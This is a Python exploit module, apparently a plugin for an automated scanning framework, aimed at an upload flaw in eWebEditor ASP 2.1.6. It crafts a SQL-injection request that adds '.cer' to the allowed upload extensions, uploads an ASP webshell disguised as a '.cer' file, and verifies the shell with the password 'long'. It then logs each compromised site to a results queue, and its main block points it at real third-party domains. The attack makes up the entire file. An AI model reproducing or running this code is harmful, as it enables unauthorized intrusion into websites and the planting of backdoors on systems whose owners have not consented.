#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#ewebeditor asp版 2.1.6 上传漏洞
import threading
import requests  #上传
import re
import sys

from class_Queue import url_exp
from yijuhua_CS import yijuhua_cs

class ewebeditor_Upload:
#    def __init__(self,url):
#        threading.Thread.__init__(self)
#        self.url=url  #线程ID
#        self.ewebeditor_asp(url)  #

    def assign(self,service, arg=None):
        if service == 'ewebeditor':
            return True, arg

    def scan(self,arg):
        try:
            self.url0, self.url1 = arg
            self.ewebeditor_asp(self.url1)
        except Exception,e:
            #print e
            return 0

    def ewebeditor_asp(self,arg):  #
        try:
            url=arg+"/jms/edit/Upload.asp?action=save&type=IMAGE&style=luoye' union select S_ID,S_Name,S_Dir,S_CSS,S_UploadDir,S_Width,S_Height,S_Memo,S_IsSys,S_FileExt,S_FlashExt, [S_ImageExt]%2b'|cer',S_MediaExt,S_FileSize,S_FlashSize,S_ImageSize,S_MediaSize,S_StateFlag,S_DetectFromWord,S_InitMode,S_BaseUrl from ewebeditor_style where s_name='standard'and'a'='a"
            files = {'uploadfile': open("long.asp.cer","rb")}
            r = requests.post(url, files=files)
            data=r.text
            #print data
            p = re.compile(r"parent.UploadSaved\('(.*?)'\)")
            sarr = p.findall(data)#找出一条
            name=sarr[0]
            #print name
            url="%s/jms/edit/uploadfile/%s"%(arg,name)
            if yijuhua_cs("asp",url,"long"):   #ASP还是PHP  ,URL地址 ，密码
                #print url+"OK"
                EXP_list=[1,self.url0,self.url1,"CN_exp_ewebeditor_Upload_asp",url,"long","webshell"]
                #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                url_exp.put(EXP_list,0.5)   #插入队列
            else:
                #print url+"NO"
                EXP_list=[0,self.url0,self.url1,"CN_exp_ewebeditor_Upload_asp",url,"long","webshell"]
                #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                url_exp.put(EXP_list,0.5)   #插入队列


        except Exception,e:
            #print e
            return 0



################################################www.fpimc.cn
if __name__=='__main__':
    #ewebeditor asp版 2.1.6 上传漏洞
    class_www=ewebeditor_Upload()
    class_www.scan(class_www.assign('ewebeditor', ("http://www.baidu.com","http://www.ranpeng.com.cn"))[1])

